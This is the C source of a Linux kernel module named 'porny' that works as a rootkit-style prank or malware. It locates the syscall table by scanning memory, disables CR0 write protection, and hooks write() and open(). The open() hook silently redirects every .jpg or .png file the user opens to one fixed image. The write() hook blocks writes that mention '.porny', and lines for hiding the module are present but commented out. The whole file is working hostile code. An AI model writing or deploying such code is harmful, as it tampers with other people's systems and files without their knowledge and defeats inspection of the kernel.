#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/fcntl.h>

MODULE_LICENSE("GPL");

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

int porny_init(void);
void porny_exit(void);
module_init(porny_init);
module_exit(porny_exit);

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
asmlinkage int (*o_open)(const char __user *pathname, int flags);

psize *sys_call_table;

psize **find(void){
    psize **sctable;
    psize i = START_CHECK;
    while(i<END_CHECK){
        sctable = (psize **) i;
        if (sctable[__NR_close] == (psize *) sys_close){
            return &sctable[0];
        } 
        i+=sizeof(void *);
    }
    return NULL;
}

asmlinkage ssize_t porny_write(int fd, const char __user *buff, ssize_t count){
    int r;
    char *proc_protect = ".porny";
    char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
    copy_from_user(kbuff,buff,255);
    if (strstr(kbuff,proc_protect)) {
        kfree(kbuff);
        return EEXIST;
    }
    r = (*o_write)(fd,buff,count);
    kfree(kbuff);
    return r;
}

asmlinkage int porny_open(const char __user *pathname, int flags){
    char* porny_path = "/home/mia/Documents/porny/data/data-gh.jpg";
    char* kbuff = (char *) kmalloc(256, GFP_KERNEL);
    copy_from_user(kbuff, pathname, 255);
    if(strstr(kbuff, ".jpg") || strstr(kbuff, ".png")){
        copy_to_user((void*)pathname, porny_path, strlen(porny_path)+1);

    }
    kfree(kbuff);
    return (*o_open)(pathname, flags); 
}

int porny_init(void) {
    printk("porny: module loaded\n");
    //list_del_init(&__this_module.list);
    //kobject_del(&THIS_MODULE->mkobj.kobj);
    if((sys_call_table = (psize*)find())){
       printk("porny: found syscall table\n");
    }
    else{
       printk("porny: syscall table not found\n");
    } 
    write_cr0(read_cr0() & (~ 0x10000));
    o_write = (void *) xchg(&sys_call_table[__NR_write],(psize)porny_write);
    o_open = (void *) xchg(&sys_call_table[__NR_open],(psize)porny_open);
    write_cr0(read_cr0() | 0x10000);

    return 0;
}

void porny_exit(void) {
   write_cr0(read_cr0() & (~ 0x10000));
   xchg(&sys_call_table[__NR_write],(psize)o_write);
   xchg(&sys_call_table[__NR_open],(psize)o_open);
   write_cr0(read_cr0() | 0x10000);
   printk("porny: module removed\n");
}
